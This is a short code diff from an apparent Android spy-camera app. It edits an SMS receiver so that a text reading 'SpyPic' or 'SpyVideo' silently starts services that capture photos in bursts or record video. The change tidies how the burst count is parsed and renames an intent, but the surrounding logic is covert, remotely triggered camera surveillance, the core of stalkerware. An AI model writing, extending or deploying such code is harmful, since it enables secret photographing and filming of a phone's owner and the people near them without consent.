@@ -32,15 +32,15 @@ public class SmsReceiver extends BroadcastReceiver {
                         Log.i("SPY_CAM" , "Msg :" + getMsg);
                         if (getMsg.equals("SpyPic")) {
                             Log.i("SPY_CAM", "Capturing Image");
-                            firstValue = Character.getNumericValue(intValue.charAt(0));
-                            System.out.println("charAt0" + intValue.charAt(0));
-                            Intent serviceIntent = new Intent(context, SpyPictureService.class);
-                            System.out.println(firstValue > 5);
-                            if (firstValue != 0 && firstValue < 5) {
-                                System.out.println("put value");
-                                serviceIntent.putExtra("brustValue" , firstValue);
+                            Intent picServiceIntent = new Intent(context, SpyPictureService.class);
+                            if (!intValue.isEmpty()) {
+                                firstValue = Character.getNumericValue(intValue.charAt(0));
                             }
-                            context.startService(serviceIntent);
+                            if (firstValue != 0 && firstValue < 5) {
+                                System.out.println("FirstValue :" + firstValue);
+                                picServiceIntent.putExtra("burstValue", firstValue);
+                            }
+                            context.startService(picServiceIntent);
                         } else if (getMsg.equals("SpyVideo")) {
                             Log.i("SPY_CAM", "Capturing Video");
                             Intent videoIntent = new Intent(context, SpyVideoService.class);
